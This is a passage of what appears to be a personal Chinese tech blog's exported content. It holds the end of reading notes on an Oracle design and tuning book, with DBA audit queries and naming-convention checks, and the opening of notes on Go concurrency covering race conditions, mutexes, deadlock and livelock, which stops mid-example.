&gt; &#x27;1&#x27;;select t.owner, t.table_name, index_name, degree, statusfrom dba_indexes twhere owner in (&#x27;TEST_USER&#x27;)  and t.degree &gt; &#x27;1&#x27;;-- 有问题就要处理，比如索引有并行，就处理如下：select &#x27;alter index &#x27; || t.owner || &#x27;.&#x27; || index_name || &#x27; noparallel;&#x27;from dba_indexes twhere owner in (&#x27;TEST_USER&#x27;)  and t.degree &gt; &#x27;1&#x27;;\n\nSQL中 HINT 的并行设置属性未设并行，但是 HINT 设并行的SQL\nselect sql_text     , sql_id     , module     , service     , first_load_time     , last_load_time     , executionsfrom v$sql twhere sql_text like &#x27;%parall%&#x27;  and t.SERVICE not like &#x27;SYS$%&#x27;;\n\n\n尽量避免对列进行运算捞取对列进行运算的SQL\nselect sql_text     , sql_id     , module     , t.service     , first_load_time     , last_load_time     , executionsfrom v$sql twhere (upper(sql_text) like &#x27;%TRUNC%&#x27;    or upper(sql_text) like &#x27;%TO_DATE%&#x27;    or upper(sql_text) like &#x27;%SUBSTR%&#x27;)  and t.SERVICE not like &#x27;SYS$%&#x27;;\n\nPL&#x2F;SQL 编写规范注释不少于代码的十分之一注释如果过少，将容易导致开发者后续忘记代码的逻辑，尤其是对新人交接很不利，一般建议注释不少于代码的十分之一。捞取注释少于代码十分之一的程序\nselect *from (select name           , t.type           , sum(case when text like &#x27;%--%&#x27; then 1 else 0 end) / count(*) rate      from user_source t      where type in (&#x27;package body&#x27;, &#x27;procedure&#x27;, &#x27;function&#x27;) -- 包头就算了      group by name, type      having sum(case when text like &#x27;%-%&#x27; then 1 else 0 end) / count(*) &lt;= 1 / 10)order by rate;\n\n\n代码必须提供最小化测试案例于注释中这是一个值得推崇的好习惯，对新人接手熟悉程序尤为有用。\n\n绑定变量\n相似语句需考虑绑定变量这里就不提供脚本了，在前面的“检查系统使用绑定变量的情况”中已提供代码。\n动态SQL最容易遗忘绑定变量一般来说，动态SQL未用绑定变量的情况多半是因为未使用 USING 关键字，所以可用如下脚本来搜索可疑的未用绑定变量的动态SQL。动态SQL未用 USING 有可能未用绑定变量\nselect *from user_sourcewhere name in      (select name       from user_source       where name in (select name from user_source where UPPER(text) like &#x27;%EXECUTE IMMEDIATE%&#x27;))  and name in      (select name from user_source where name in (select name from user_source where UPPER(text) like &#x27;%||%&#x27;))  and name not in      (select name from user_source where name in (select name from user_source where upper(text) not like &#x27;%USING%&#x27;));\n\n\n尽量使用批量提交未使用批量提交，一般都是因为将 commit 写到了循环内。以下语句可查出单个 session 提交次数超过10000次的情况，这么多次很可疑，应该捞取出来进行分析。查询提交次数过多的 SESSION\nselect t1.sid, t1.value, t2.namefrom v$sesstat t1   , v$statname t2--where t2.name like &#x27;%commit%&#x27;where t2.name like &#x27;%user commits%&#x27; --可以只选user commits,其他系统级的先不关心  and t1.STATISTIC# = t2.STATISTIC#  and value &gt; 10000order by value desc;\n\n\n同一过程包中出现重复逻辑块需封装，统一调用这是封装的概念，否则修改统一逻辑，代码可能需要修改多处，不利于维护。\n\n生产环境尽量使用包来封装过程和函数一般来说，只要是正式的产品，就必须使用包。查询未用包的程序逻辑\nselect distinct name, typefrom user_sourcewhere type in (&#x27;PROCEDURE&#x27;, &#x27;FUNCTION&#x27;)order by type;\n\n\n动态SQL编写需设法保存真实SQL动态SQL编写最大的麻烦在于调试困难，因为语句是拼装组合而成的，无论是出现该语句的语法错误还是性能问题，都无法被有效跟踪到。此时考虑将拼装成的$QL记录在某张表里，将会给调试跟踪带来极大的方便。\n设计规范 助设计者运筹帷幄表规范范式\n\n绝大部分场景要遵循第三范式。减少数据冗余\n适当场景考虑反范式。为提高性能\n\n\n不同类表的要点差异\n\n小表（参数配置表）\n一般需要有主键。\n一般需要有约束。\n尽量规划在同一表空间。\n\n\n大表（业务表及日志表）\n尺寸超过10GB需考虑建分区\n分区表中分区个数超过100要注意\n大表尽量要有明确的数据保留策略\n体现在设计文档。\n实现步骤体现在维护脚本中。\n体现在表注释中。\n\n\n大表坚决不允许有触发器\n\n\n\n-- 表大小超过10GB未建分区的select owner     , segment_name     , segment_type     , sum(bytes) / 1024 / 1024 / 1024 object_sizefrom dba_segmentsWHERE segment_type = &#x27;TABLE&#x27; -- 此处说明是普通表，不是分区表，如果是分区表，类型是TABLE PARTITIONgroup by owner, segment_name, segment_typehaving sum(bytes) / 1024 / 1024 / 1024 &gt;= 10order by object_size desc;-- 分区个数超过100个的表select table_owner, table_name, count(*) cntfrom dba_tab_partitionsWHERE table_owner in (&#x27;TEST_USER&#x27;)having count(*) &gt;= 100group by table_owner, table_nameorder by cnt desc;-- 表大小超过10GB，有时间字段，可以考虑在该列上建立分区-- 超过10GB的大表没有时间字段select T1.*, t2.column_name, t2.data_typefrom (select segment_name           , segment_type           , sum(bytes) / 1024 / 1024 / 1024 object_size      from user_segments      WHERE segment_type = &#x27;TABLE&#x27; --此处说明是普通表，不是分区表，如果是分区表，类型是TABLE PARTITION      group by segment_name, segment_type      having sum(bytes) / 1024 / 1024 / 1024 &gt;= 0.01      order by object_size desc) t1   , user_tab_columns t2where t1.segment_name = t2.table_name(+)  and t2.DATA_TYPE = &#x27;DATE&#x27;-- 来说明这个大表有时间列-- 上述语句和下面的语句进行观察比较 下面只是过滤了大小select segment_name     , segment_type     , sum(bytes) / 1024 / 1024 / 1024 object_sizefrom user_segmentsWHERE segment_type = &#x27;TABLE&#x27; -- 此处说明是普通表，不是分区表，如果是分区表，类型是TABLE PARTITIONgroup by segment_name, segment_typehaving sum(bytes) / 1024 / 1024 / 1024 &gt;= 0.01order by object_size desc;-- 找出有建触发器的表，同时观察该表多大select trigger_name, table_name, tab_sizefrom user_triggers t1   , (select segment_name, sum(bytes / 1024 / 1024 / 1024) tab_size      from user_segments t      where t.segment_type = &#x27;TABLE&#x27;      group by segment_name) t2where t1.TABLE_NAME = t2.segment_name;\n\n注：触发器是一种存储在数据库中的程序，它定义了一组SQL语句，当特定的事件发生时自动执行这组SQL语句。这些事件通常是数据操作语言（DML）事件，如INSERT、UPDATE或DELETE操作。触发器可以用来强制执行复杂的业务规则或者维护数据完整性，例如级联更新或删除相关的行，或者记录审计日志等。\n为什么大表不要有触发器？\n\n性能影响：\n当对大表进行大量的DML操作时，触发器会在每个受影响的行上被执行，这会导致额外的CPU和I&#x2F;O负载。如果触发器内含有复杂的逻辑或者需要访问其他表，则性能影响会更加严重。\n在高并发环境下，多个事务同时尝试修改大表中的数据，触发器的执行可能导致更多的锁等待，从而增加事务处理的时间。\n\n\n可扩展性问题：\n随着表的增长，触发器的开销也会变得越来越显著。对于大规模的数据修改操作，触发器可能导致长时间的锁定，进而影响整个系统的响应时间和吞吐量。\n\n\n维护复杂性：\n触发器使得数据库逻辑变得复杂，特别是在涉及多表或多步骤操作的情况下。维护触发器代码的正确性和效率也变得更加困难。\n\n\n\n\n表结构\n\n注释\n表必须要有注释\n列尽量要有注释\n\n\n列类型\n避免使用LONG字段。可以说，现在的应用中，LONG字段几乎是有百害而无一利，所以尽量要杜绝在设计中出现LONG,一般考虑CLOB字段来替代。\n避免用CHAR字段。CHAR字段的应用场合非常少，一般现在都考虑用VARCHAR2来替代。\n列类型和值尽量匹配\n时间取值放入 date 列。\n数字取值放入 number 列。\n字符串取值放入 varchar2 列。\n\n\n\n\n\n-- 查询那些表未做注释select TABLE_NAME, T.TABLE_TYPEfrom USER_TAB_COMMENTS Twhere table_name not like &#x27;BIN$%&#x27;  and comments is nullorder by table_name;-- 查询哪些列未做注释（仅供参考)select TABLE_NAME, COLUMN_NAMEfrom USER_COL_COMMENTSwhere table_name not like &#x27;BIN$%&#x27;  and comments is nullorder by table_name;-- 查询哪些列是LONG类型SELECT TABLE_NAME, COLUMN_NAME, DATA_TYPEFROM user_tab_columnsWHERE DATA_TYPE = &#x27;LONG&#x27;ORDER BY 1, 2;-- 查询哪些列是CHAR类型SELECT TABLE_NAME, COLUMN_NAME, DATA_TYPEFROM user_tab_columnsWHERE DATA_TYPE = &#x27;CHAR&#x27;ORDER BY 1, 2;\n\n索引规范用不上分区条件的局部索引不宜建分区表建了分区索引后，如果在查询应用中无法用到这个分区索引列的条件，索引读将可能遍历所有的分区。如果有100个分区，相当于遍历了100个小索引，将会严重影响性能，此时需要慎重考虑，判断是否需要修改为全局索引。\n\n函数索引大多用于列运算，一般需要避免从实际应用情况来分析，应用函数索引大多是因为设计阶段考虑步骤，比如 trunc(时间列) 的写法，往往可以轻易转换成去掉 trunc的写法，所以需要捞取出来验证。\n-- 查询哪些索引是函数索引select t.index_name     , t.index_type     , t.status     , t.blevel     , t.leaf_blocksfrom user_indexes twhere index_type in (&#x27;FUNCTION-BASED NORMAL&#x27;);\n\n\n位图索引遇到更新将是噩梦，需谨慎设计\n\n位图索引不适合用在表频繁更新的场合。\n位图索引不适合在所在列重复度很低的场合。\n\n因为位图索引的应用比较特殊，适用场合比较少，因此有必要捞取出系统中的位图索引，进行核对检测。\n-- 查询哪些索引是位图索引select t.index_name     , t.index_type     , t.status     , t.blevel     , t.leaf_blocksfrom user_indexes twhere index_type in (&#x27;BITMAP&#x27;);\n\n\n外键未建索引将引发死锁及影响表连接性能外键未建索引，将有可能导致两个严重的问题：一是更新相关的表产生死锁；二是两表关联查询时性能低下。因此设计中需要谨慎考虑。\n-- 查询外键未建索引的表有哪些select table_name     , constraint_name     , cname1 || nvl2(cname2, &#x27;,&#x27; || cname2, null) ||       nvl2(cname3, &#x27;,&#x27; || cname3, null) ||       nvl2(cname4, &#x27;,&#x27; || cname4, null) ||       nvl2(cname5, &#x27;,&#x27; || cname5, null) ||       nvl2(cname6, &#x27;,&#x27; || cname6, null) ||       nvl2(cname7, &#x27;,&#x27; || cname7, null) ||       nvl2(cname8, &#x27;,&#x27; || cname8, null) columnsfrom (select b.table_name           , b.constraint_name           , max(decode(position, 1, column_name, null)) cname1           , max(decode(position, 2, column_name, null)) cname2           , max(decode(position, 3, column_name, null)) cname3           , max(decode(position, 4, column_name, null)) cname4           , max(decode(position, 5, column_name, null)) cname5           , max(decode(position, 6, column_name, null)) cname6           , max(decode(position, 7, column_name, null)) cname7           , max(decode(position, 8, column_name, null)) cname8           , count(*)                                    col_cnt      from (select substr(table_name, 1, 30)      table_name                 , substr(constraint_name, 1, 30) constraint_name                 , substr(column_name, 1, 30)     column_name                 , position            from user_cons_columns) a         , user_constraints b      where a.constraint_name = b.constraint_name        and b.constraint_type = &#x27;R&#x27;      group by b.table_name, b.constraint_name) conswhere col_cnt &gt; ALL      (select count(*)       from user_ind_columns i       where i.table_name = cons.table_name         and i.column_name in (cname1, cname2, cname3, cname4, cname5,                               cname6, cname7, cname8)         and i.column_position &lt;= cons.col_cnt       group by i.index_name);\n\n\n建联合索引需谨慎\n要结合单列查询考虑，决定前缀如：既可以建立col1,col2的联合索引，又可以建立col2,col1的联合索引，此时如果存在col1列单独查询较多的情况下，一般倾向于建立col1,col2的联合索引。\n范围查询影响组合索引组合查询中，如果有等值条件和范围条件组合的情况，等值条件在前，性能更高。如：where col1&#x3D;2 and col2&gt;&#x3D;100 and col2&lt;&#x3D;120,此时是col1,col2的组合索引性能高过col2,col1的组合索引。\n-- 将有不等值查询的SQL捞取出来分析select sql_text     , sql_id     , service     , module     , t.first_load_time     , t.last_load_timefrom v$sql twhere (sql_text like &#x27;%&gt;%&#x27; or sql_text like &#x27;%&lt;%&#x27; or sql_text like &#x27;%&lt;&gt;%&#x27;)  and sql_text not like &#x27;%=&gt;%&#x27;  and service not like &#x27;SYS$%&#x27;;\n\n需考虑回表因素一般情况下，如果建索引可以避免回表（在索引中即可完成检测），也可考虑对多列建组合索引，不过组合索引列不宜超过4个。\n超过4个字段的联合索引需注意\n-- 捞取超过4个字段组合的联合索引select table_name, index_name, count(*)from user_ind_columnsgroup by table_name, index_namehaving count(*) &gt;= 4order by count(*) desc;\n\n\n单表索引个数需控制\n索引个数超过5个以上的超过5个以上的索引，在表的记录很大时，将会极大地影响该表的更新，因此在表中建索引时需要谨慎考虑。\n-- 单表的索引个数超过5个需注意select table_name, count(*)from user_indexesgroup by table_namehaving count(*) &gt;= 5order by count(*) desc;\n\n建后2个月内从未使用过的索引一般来说，在2个月内从未被用到的索引是多余的索引，可以考虑删除。\n-- 跟踪索引的使用情况，控制索引的数量select &#x27;alter index &#x27; || index_name || &#x27; monitoring usage;&#x27;from user_indexes;-- 然后观察：select *from v$object_usage;-- 停止对索引的监控，观察v$object_usage状态变化（以某索引IDX_OBJECT_ID为例）alter index IDX_OBJECT_ID nomonitoring usage;\n\n\n单表无任何索引需重视单表无任何索引的情况一般比较少见，可以捞取出来，再结合SQL应用进行分析，观察该表的大小以及是否有时间字段及编码字段这样的适宜建索引的列。\n-- 查询无任何索引的表select table_namefrom user_tableswhere table_name not in (select table_name from user_indexes);\n\n\n需注意索引的失效情况\n\n对表进行move操作，会导致索引失效，操作需考忠索引的重建。\n对分区表进行系列操作，如 split、drop、truncate 分区时，容易导致分区表的全局索引失效，需要考虑增加update global indexes的关键字进行操作，或者重建索引。\n分区表SPLIT的时候，如果MAX区中已经有记录了，这个时候SPLIT就会导致有记录的新增分区的局部索引失效。\n\n普通表及分区表的全局索引失效\n-- 查询失效的普通索引select index_name, table_name, tablespace_name, index_typefrom user_indexeswhere status = &#x27;UNUSABLE&#x27;;\n\n分区表局部索引失效\n-- 查询失效的分区局部索引select t1.index_name     , t1.partition_name     , t1.global_stats     , t2.table_name     , t2.table_typefrom user_ind_partitions t1   , user_indexes t2where t2.index_name = t1.index_nameand t1.status =&#x27;UNUSABLE&#x27;;\n\n环境参数规范数据库参数\nSGA及PGA参数\nOLTP应用是主机内存的80%分配数据库，其中 SGA80%,PGA20%。OLAP应用是主机内存的80%分配数据库，其中 SGA50%,PGA50%。如OLTP应用：主机内存30GB,SGA即是 30 X 0.8 X 0.8 &#x3D; 20GB 左右。不过这里还是要注意：并没有什么黄金参数，这些还只能是参考。\nPROCESS&#x2F;SESSION\n-- 默认连接数是150，这对大多数应用都无法满足，大型应用一般不少于1000个。show parameter processshow parameter sessionselect count(*)from v$process;select count(*)from v$session;\n\n\nOPEN_CURSOR游标参数\n-- 默认open_cursors是300，大型应用需设置1000以上，原则上不超过PROCESS设置。show parameter open_cursor\n\n日志参数一般来说，Oracle默认的日志参数是3组，大小为500MB,在实际较大的生产应用中往往不够，需要至少考虑在5组以上，大小在1GB以上。\n-- 生产系统大多需要开启归档。archive log list\n\n\n表空间规划\n\n回滚表空间\n自动管理。\n避免自动扩展。\n尽可能规划大一些。\n\n\n临时表空间\n避免自动扩展。\n尽可能大。\n尽可能使用临时表空间组。\n\n\n业务表空间\n控制个数，不超过6个为宜。\n尽量避免自动扩展，超阀值由监控来检查。\n根据自己的业务，固定表空间名。\n表空间需良好分类（参数配置表，业务数据表，历史记录表）。\n表空间需合理命名。\n\n\n\n\nRAC系统\n\n尽量采用BALANCE模式，保证两节点压力大致相当。\n可适当考虑不同类型的业务部署在不同的节点上，避免RAC的CACHE争用。\n尽量考虑不同的节点使用不同的临时表空间。\n\n命名规范只是示范，一般都有自己的命名方式，但团队要有统一的规范。\n-- 查询表的前缀是否以t_开头select*from user_tableswhere substr(table_name, 1, 2) &lt;&gt; &#x27;T_&#x27;;-- 查询视图的前缀是否以v_开头select view_namefrom user_viewswhere substr(view_name, 1, 2) &lt;&gt; &#x27;V_&#x27;;-- 查询同义词的前缀是否以s_开头select synonym_name, table_owner, table_namefrom user_synonymswhere substr(synonym_name, 1, 2) &lt;&gt; &#x27;S_&#x27;;-- 查询簇表的前缀是否以c_开头select t.cluster_name, t.cluster_typefrom user_clusters twhere substr(cluster_name, 1, 2) &lt;&gt; &#x27;C_&#x27;;-- 查询序列的前缀是否以seq开头或结尾select sequence_name, cache_sizefrom user_sequenceswhere sequence_name not like &#x27;%SEQ%&#x27;;-- 查询存储过程是否以p_开头select object_name, procedure_namefrom user_procedureswhere object_type = &#x27;PROCEDURE&#x27;  and substr(object_name, 1, 2) &lt;&gt; &#x27;P_&#x27;;-- 查询函数是否以f_开头select object_name, procedure_namefrom user_procedureswhere object_type = &#x27;FUNCTION&#x27;  and substr(object_name, 1, 2) &lt;&gt; &#x27;F_&#x27;;-- 查询包是否以pkg开头select object_name, procedure_namefrom user_procedureswhere object_type = &#x27;PACKAGE&#x27;  and substr(object_name, 1, 4) &lt;&gt; &#x27;PKG&#x27;;-- 查询类是否以typ开头select object_name, procedure_namefrom user_procedureswhere object_type = &#x27;TYPE&#x27;  and substr(object_name, 1, 4) &lt;&gt; &#x27;TYP&#x27;;-- 查询主键是否以pk_开头select constraint_name, table_namefrom user_constraintswhere constraint_type = &#x27;p&#x27;  and substr(constraint_name, 1, 3) &lt;&gt; &#x27;PK_&#x27;  and constraint_name not like &#x27;BINS%&#x27;;-- 查询外键是否以fk_开头select constraint_name, table_namefrom user_constraintswhere constraint_type = &#x27;R&#x27;  and substr(constraint_name, 1, 3) &lt;&gt; &#x27;FK_&#x27;  and constraint_name not like &#x27;BINS%&#x27;;-- 查询唯一索引是否以ux_开头select constraint_name, table_namefrom user_constraintswhere constraint_type = &#x27;U&#x27;  and substr(constraint_name, 1, 3) &lt;&gt; &#x27;UX_&#x27;  and table_name not like &#x27;BINS%&#x27;;-- 查询普通索引是否以idx_开头select index_name, table_namefrom user_indexeswhere index_type = &#x27;NORMAL&#x27;  and uniqueness = &#x27;NONUNIQUE&#x27;  and substr(index_name, 1, 4) &lt;&gt; &#x27;IDX_&#x27;  and table_name not like &#x27;BINS%&#x27;;-- 查询位图索引是否以bx_开头select index_name, table_namefrom user_indexeswhere index_type LIKE &#x27;%BIT%&#x27;  and substr(index_name, 1, 3) &lt;&gt; &#x27;BX_&#x27;  and table_name not like &#x27;BINS%&#x27;;-- 查询函数索引是否以fx_开头select index_name, table_namefrom user_indexeswhere index_type = &#x27;FUNCTION-BASED NORMAL&#x27;  and substr(index_name, 1, 3) &lt;&gt; &#x27;FX_&#x27;  and table_name not like &#x27;BINS%&#x27;;\n\nEND终于是结束了，算是第一本静下心来读完的技术相关的书。从git提交记录也可以看出，读了快两个月，中间有半个多月的空窗。是有点看不到下去了，是最艰难的索引章节，一章就占了全书的四分之一还多。前面体系结构、逻辑结构里的sql还能基本都在自己搭的测试环境中验证下，但到索引很多都没有去验证，实在是太多了。算是个偷懒的地方吧，不过最后还是读完了。\n这本书的作者 梁敬彬、梁敬弘 后面还写了一本 《收获，不止SQL优化》，等缓一缓，后面肯定会继续读的。先整点非技术相关的书，或者非数据库相关的书调节一下。就这样，Bye\n","categories":["读书笔记"],"tags":["数据库","《收获，不止Oracle》","Oracle"]},{"title":"《go语言并发之道》读书笔记-关于并发","url":"/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8Ago%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E4%B9%8B%E9%81%93%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E5%85%B3%E4%BA%8E%E5%B9%B6%E5%8F%91/","content":"前言又开新书了，按照原来的计划，其实这次应该读的是 Kafka 相关的。但奈何计划赶不上变化。\n前几天给鱼排论坛写了聊天室的消息分发节点 rhyus-golang，纯纯的多线程需要考虑并发的应用（虽然并发不高）。所以变成了并发相关的书。\n这篇计划阅读前两章，是关于并发概念的。\n第一章 - 并发概述书中前面关于摩尔定律、Web Scale和云计算相关的话题就跳过了。\n为什么并发很难？众所周知，并发代码是很难正确构建的。它通常需要完成几个迭代才能让它按预期的方式工作，即使这样，在某些时间点（更高的磁盘利用率、更多的用户登录到系统等)到达之前，bug在代码中存在数年的事情也不少见，以至于以前未被发现的bug在后面显露出来。这段话我是有点体会的，上面的节点程序我迭代了很多次，很多问题都得在高并发或者高负载时才会出现。\n竞态条件当两个或多个操作必须按正确的顺序执行，而程序并未保证这个顺序，就会发生竞争条件。大多数情况下，这将在所谓的数据中出现，其中一个并发操作尝试读取一个变量，而在某个不确定的时间，另一个并发操作试图写入同一个变量。\n下面是一个基本示例：\npackage mainimport &quot;fmt&quot;func main() &#123;\tvar data int\tgo func() &#123;\t\tdata++\t&#125;()\tif data == 0 &#123;\t\tfmt.Printf(&quot;the value is %v.\\n&quot;, data)\t&#125;&#125;\n\n这里，第8行和第11行都试图访问变量data,但并不能保证以什么顺序进行访问。运行这段代码有三种可能的结果：\n\n不打印任何东西。在这种情况下，第8行在第10行之前执行。\n打印“the value is 0.”。在这种情况下，第10行和第11行在第8行之前执行。\n打印“the value is 1.”。在这种情况下，第8行在第10行之前执行，但第8行在第11行之前执行。\n\n如你所见，虽然只有几行不正确的代码，但在你的程序中引入了巨大的不确定性。在并发代码中定位问题是非常困难的，需要考虑到各种可能出现的情况。\n有时候想象在两个操作之间会经过很长一段时间很有帮助。假设调用goroutine的时间和它运行的时间相差1h。那程序的其余部分将如何运行呢？如果在goroutine执行成功和程序执行到if语句之间也花费了一小时，又会发生什么呢？以这种方式思考对我很有帮助，因为对于计算机来说，规模可能不同，但相对的时间差异或多或少是相同的。\n所以有时候，会出现下面的代码（在程序中大量使用休眠语句）\npackage mainimport (\t&quot;fmt&quot;\t&quot;time&quot;)func main() &#123;\tvar data int\tgo func() &#123;\t\tdata++\t&#125;()\ttime.Sleep(1 * time.Second) // 这种方式非常不优雅\tif data == 0 &#123;\t\tfmt.Printf(&quot;the value is %v.\\n&quot;, data)\t&#125;&#125;\n\n我们的数据竞争问题解决了吗？并没有。事实上，在这个程序中之前的三个结果仍然有可能出现，只是可能性更小了。我们在调用 goroutine 和检查数据值之间的休眠的时间越长，我们的程序就越接近正确，但那只是概率上接近逻辑的正确性：它永远不会真的变成逻辑上的正确。\n除此之外，这让我们的算法变得低效。我们现在不得不休眠1s,来降低我们的程序出现数据竞争的可能。所以，我们应该始终以逻辑正确性为目标。在代码中引人休眠可以方便地调试并发程序，但这并不能称之为一个解决方案。\n\n竞争条件是最难以发现的并发bug类型之一，因为它们可能在代码投人生产多年之后才出现。通常代码正在执行时环境产生变化，或发生了某些罕见的事情，都有可能使其浮现出来。往往代码只是看上去在用正确的方式来执行，但是事实上只是执行的顺序是正确的这件事本身的概率比较大而已，最终早晚有可能会出现一些意想之外的结果。\n\n原子性当某些东西被队为是原子的，或者具有原子性的时候，这意味着在它运行的环境中，它是不可分割的或不可中断的。\n那么这到底意味着什么，为什么在使用并发代码时知道这一点很重要？第一件非常重要的事情是“上下文(context)”这个词。可能在某个上下文中有些东西是原子性的，而在另一个上下文中却不是。在你的进程上下文中进行原子操作在操作系统的上下文中可能就不是原子操作；在操作系统环境中原子操作在机器环境中可能就不是原子的，在你的机器上下文中原子操作在你的应用程序的上下文中可能不是原子的。换句话说，操作的原子性可以根据当前定义的范围而改变。这种特性对你来说有利有弊！\n在考虑原子性时，经常第一件需要做的事就是定义上下文或范围，然后再考虑这些操作是否是原子性的。一切都应当遵循这个原则。\n术语“不可分割”(indivisible)和“不可中断”(uninterruptible)。这些术语意味着在你所定义的上下文中，原子的东西将被完整的运行，而在这种情况下不会同时发生任何事情。这仍然是一个整体，所以我们来看一个例子：i++这是一个任何人都可以设计的简单例子，但它很容易证明原子性的概念。它可能看起来很原子，但是简要地分析一下就会发现其中有以下步骤：\n\n检索i的值。\n增加i的值。\n存储i的值。\n\n尽管这些操作中的每一个都是原子的，但三者的结合就可能不是，这取决于你的上下文。这揭示了原子操作的一个有趣的性质：将它们结合并不一定会产生更大的原子操作。使一个操作变为原子操作取决于你想让它在哪个上下文中。如果你的上下文是一个没有并发进程的程序，那么该代码在该上下文中就是原子的。如果你的上下文是一个goroutine,它不会将i暴露给其他 goroutine ,那么这个代码就是原子的。\n为什么我们要关心这些呢？原子性非常重要，**因为如果某个东西是原子的，隐含的意思是它在并发环境中是安全的。**这使我们能够编写逻辑上正确的程序，并且这甚至可以作为优化并发程序的一种方式。但大多数语句不是原子的，更不用说函数、方法和程序了。后面会通过各种方法来调和这个矛盾。\n内存访问同步假设有这样一个数据竞争：两个并发进程试图访问相同的内存区域，它们访问内存的方式不是原子的。将之前的数据竞争的例子稍作修改就可以说明：\npackage mainimport &quot;fmt&quot;func main() &#123;\tvar data int\tgo func() &#123; data++ &#125;()\tif data == 0 &#123;\t\tfmt.Println(&quot;the value is 0.&quot;)\t&#125; else &#123;\t\tfmt.Printf(&quot;the value is %v.\\n&quot;, data)\t&#125;&#125;\n\n在这里添加了一个e1se子句，所以不管数据的值如何，我们总会得到一些输出。请记住，正如之前所介绍，如果有一个数据竞争存在，那么该程序的输出将是完全不确定的。实际上，程序中需要独占访问共享资源的部分有一个专有名词，叫临界区(critical section)。在这个例子中，我们有三个临界区：\n\n我们的 goroutine 正在增加数据变量。\n我们的 if 语句，它检查数据的值是否为0。\n我们的 fmt.Printf 语句，在检索并输出数据的值。\n\n有很多方法可以保护你的程序的临界区，go语言在设计时有一些更好的想法来解决这个问题，不过解决这个问题的其中一个办法是在你的临界区之间内存访问做同步。（加锁）下面的代码不是Go语言中惯用的方法（我不建议像这样解决你的数据竞争问题)，但它很简单地演示了内存访问同步。\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)func main() &#123;\tvar memoryAccess sync.Mutex\tvar value int\tgo func() &#123;\t\tmemoryAccess.Lock()\t\tvalue++\t\tmemoryAccess.Unlock()\t&#125;()\tmemoryAccess.Lock()\tif value == 0 &#123;\t\tfmt.Printf(&quot;the value is %v.\\n&quot;, value)\t&#125; else &#123;\t\tfmt.Printf(&quot;the value is %v.\\n&quot;, value)\t&#125;\tmemoryAccess.Unlock()&#125;\n\n在这里添加一个变量 memoryAccess，它将允许我们的代码对内存数据的访问做同步。（锁，后续介绍）这样虽然解决了数据竞争，但是并没有解决竞争条件。即这个程序的操作顺序仍然是不确定的，只是缩小了非确定性的范围。\n从表面上看，这似乎很简单：如果你发现你的代码中有临界区，那就添加锁来同步内存访问！虽然通过内存访问同步来解决一些问题，但正如我们刚刚看到的，它不会自动解决数据竞争或逻辑正确性问题。此外，它也可能造成维护和性能问题。\n还有个问题就是 Lock 的调用会使我们的程序变慢。每次执行这些操作时，我们的程序就会暂停一段时间。这会带来两个问题：\n\n临界区是否是频繁进入和退出？（锁竞争）\n临界区应该有多大？（锁的粒度）\n\n在程序的上下文中解决这两个问题是一种艺术，并且增加了内存访问同步的难度。\n死锁、活锁和饥饿死锁死锁程序是所有的并发进程彼此等待的程序。在这种情况下，如果没有外界的干预，这个程序将永远无法恢复。\n这听起来很严峻，那是因为的确如此！Go语言的运行时会尽其所能，检测一些死锁（所有的goroutine必须被阻塞，或者“asleep”），但是这对于防止死锁并没有太多的帮助。\n下面是一个死锁的例子：\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;\t&quot;time&quot;)type value struct &#123;\tmu    sync.Mutex\tvalue int&#125;func main() &#123;\tvar wg sync.WaitGroup\tprintSum := func(v1, v2 *value) &#123;\t\tdefer wg.Done()\t\tv1.mu.Lock()\t\tdefer v1.mu.Unlock()\t\ttime.Sleep(time.Second)\t\tv2.mu.Lock()\t\tdefer v2.mu.Unlock()\t\tfmt.Printf(&quot;sum = %v\\n&quot;, v1.value+v2.value)\t&#125;\tvar a, b value\twg.Add(2)\tgo printSum(&amp;a, &amp;b)\tgo printSum(&amp;b, &amp;a)\twg.Wait()&#125;\n\n运行会报错 fatal error: all goroutines are asleep - deadlock!\n事实证明，出现死锁有儿个必要条件。I971年，Edgar Coffman 在一篇论文中列举了这些条件。这些条件现在被称为 Coffman 条件，是帮助检测、防止和纠正死锁的技术依据。Coffman 条件如下：\n\n互斥条件 - 并发进程同时拥有资源的独占权。\n占有并等待条件 - 并发进程必须同时拥有一个资源，并等待额外的资源。\n非抢占条件 - 并发进程拥有的资源只能被该进程释放，即可满足这个条件。\n循环等待条件 - 一个并发进程(P1)必须等待一系列其他并发进程(P2),这些并发进程同时也在等待进程(P1),这样便满足了这个最终条件。\n\n这些规则也帮助我们防止死锁。如果确保至少有一个条件不成立，我们可以防止发生死锁。不幸的是，实际上这些条件很难推理，因此很难预防。\n活锁活锁是正在主动执行并发操作的程序，但是这些操作无法向前推进程序的状态。\n你曾经在走廊走向另一个人吗？她移动到一边让你通过，但你也做了同样的事情。所以你转到另一边，但她也是这样做的。想象一下这个情形永远持续下去，你就明白了活锁。这个倒是经常发生\n下面是一个活锁的例子，就是上面所说的情况：\npackage mainimport (\t&quot;bytes&quot;\t&quot;fmt&quot;\t&quot;sync&quot;\t&quot;sync/atomic&quot;\t&quot;time&quot;)type value struct &#123;\tmu    sync.Mutex\tvalue int&#125;func main() &#123;\tcadence := sync.NewCond(&amp;sync.Mutex&#123;&#125;)\tgo func() &#123;\t\tfor range time.Tick(1 * time.Millisecond) &#123;\t\t\tcadence.Broadcast()\t\t&#125;\t&#125;()\ttakeStep := func() &#123;\t\tcadence.L.Lock()\t\tcadence.Wait()\t\tcadence.L.Unlock()\t&#125;\ttryDir := func(dirName string, dir *int32, out *bytes.Buffer) bool &#123;\t\tfmt.Fprintf(out, &quot; %v&quot;, dirName)\t\tatomic.AddInt32(dir, 1)\t\ttakeStep()\t\tif atomic.LoadInt32(dir) == 1 &#123;\t\t\tfmt.Fprint(out, &quot;Success!&quot;)\t\t\treturn true\t\t&#125;\t\ttakeStep()\t\tatomic.AddInt32(dir, -1)\t\treturn false\t&#125;\tvar left, right int32\ttryLeft := func(out *bytes.Buffer) bool &#123; return tryDir(&quot;left&quot;, &amp;left, out) &#125;\ttryRight := func(out *bytes.Buffer) bool &#123; return tryDir(&quot;right&quot;, &amp;right, out) &#125;\twalk := func(walking *sync.WaitGroup, name string) &#123;\t\tvar out bytes.Buffer\t\tdefer func() &#123; fmt.Println(out.String()) &#125;()\t\tdefer 